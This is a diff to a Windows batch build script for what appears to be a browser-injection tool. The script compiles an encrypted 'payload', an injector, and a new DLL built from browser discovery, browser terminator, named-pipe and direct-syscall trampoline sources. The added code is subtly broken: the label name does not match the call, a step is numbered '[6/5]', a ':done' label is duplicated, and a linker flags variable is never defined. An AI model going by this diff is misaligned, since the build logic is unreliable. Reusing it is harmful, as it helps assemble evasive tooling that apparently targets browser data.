@@ -22,6 +22,7 @@ set "CFLAGS_SQLITE=/nologo /W0 /O1 /Os /MT /GS- /Gy /GL /DSQLITE_OMIT_LOAD_EXTEN
 set "LFLAGS_COMMON=/NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /INCREMENTAL:NO"
 set "LFLAGS_MERGE=/MERGE:.rdata=.text"
 
+
 :: Create build directory
 if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
 
@@ -62,6 +63,7 @@ call :compile_sqlite
 call :compile_payload
 call :encrypt_payload
 call :compile_injector
+call :compile_dll
 echo.
 echo =============================================================================
 echo [+] Build Complete: %FINAL_EXE_NAME%
@@ -145,6 +147,35 @@ link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
 goto :eof
 
 :done
+
+:compile dll
+echo [6/5] Compiling DLL...
+if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
+    armasm64.exe -nologo "%SRC_DIR%\sys\syscall_trampoline_arm64.asm" -o "%BUILD_DIR%\syscall_trampoline.obj"
+) else (
+    ml64.exe /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline.obj" "%SRC_DIR%\sys\syscall_trampoline_x64.asm"
+)
+set "CFLAGS_COMMON_DLL=/D_USRDLL /D_WINDLL /MT"
+
+cl %CFLAGS_COMMON_DLL% %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
+cl %CFLAGS_COMMON_DLL% %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
+cl %CFLAGS_COMMON_DLL% %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
+cl %CFLAGS_COMMON_DLL% %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
+cl %CFLAGS_COMMON_DLL% %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
+cl %CFLAGS_COMMON_DLL% %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
+cl %CFLAGS_COMMON_DLL% %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
+
+link %LFLAGS_COMMON_DLL% %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:"%BUILD_DIR%\lib.dll" ^
+    "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
+    "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
+    "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
+    "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
+    "%BUILD_DIR%\syscall_trampoline.obj" ^
+    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+goto :eof
+:done
+
+
 echo.
 echo =============================================================================
 echo [+] Build Complete: %FINAL_EXE_NAME%
